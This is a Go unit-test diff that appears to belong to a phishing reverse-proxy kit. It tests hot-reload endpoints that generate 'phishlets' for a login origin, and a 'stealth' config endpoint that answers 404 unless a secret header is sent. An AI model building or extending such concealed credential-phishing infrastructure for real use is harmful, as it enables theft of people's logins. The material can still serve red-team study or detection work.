@@ -95,8 +95,7 @@ func TestDashboardStealth(t *testing.T) {	h := Handler(testDeps())
 	}
 }
 
-func withHooks(d Deps) Deps {
-	d.OnReload = func() error { return nil }
+func withHooks(d Deps) Deps {	d.OnReload = func() error { return nil }
 	d.OnUpsert = func(yml []byte) (string, error) {
 		up, ok := d.Store.(interface {
 			UpsertYAML([]byte) (*core.Phishlet, error)
@@ -163,5 +162,31 @@ func TestHotReloadEndpoints(t *testing.T) {
 		`{"origin":"login.x.com","domain":"p.test","id":"g1"}`))
 	if rec4.Code != 200 || !strings.Contains(rec4.Body.String(), "g1") {
 		t.Fatalf("generate: %d %s", rec4.Code, rec4.Body.String())
+	}
+}
+
+func TestConfigEndpoint(t *testing.T) {
+	d := testDeps()
+	d.NodeID = "eu-1"
+	d.Config = func() map[string]any { return map[string]any{"domains": []string{"a.test"}} }
+	h := Handler(d)
+	// без хедера — 404
+	rec := httptest.NewRequest("GET", "/api/v1/config", nil)
+	r0 := httptest.NewRecorder()
+	h.ServeHTTP(r0, rec)
+	if r0.Code != http.StatusNotFound {
+		t.Fatalf("stealth: %d", r0.Code)
+	}
+	rec2 := httptest.NewRecorder()
+	h.ServeHTTP(rec2, stealthReq(http.MethodGet, "/api/v1/config", ""))
+	if rec2.Code != 200 {
+		t.Fatalf("config: %d", rec2.Code)
+	}
+	var out map[string]any
+	if err := json.NewDecoder(rec2.Body).Decode(&out); err != nil {
+		t.Fatal(err)
+	}
+	if out["node"] != "eu-1" || out["domains"] == nil {
+		t.Fatalf("bad config: %v", out)
 	}
 }
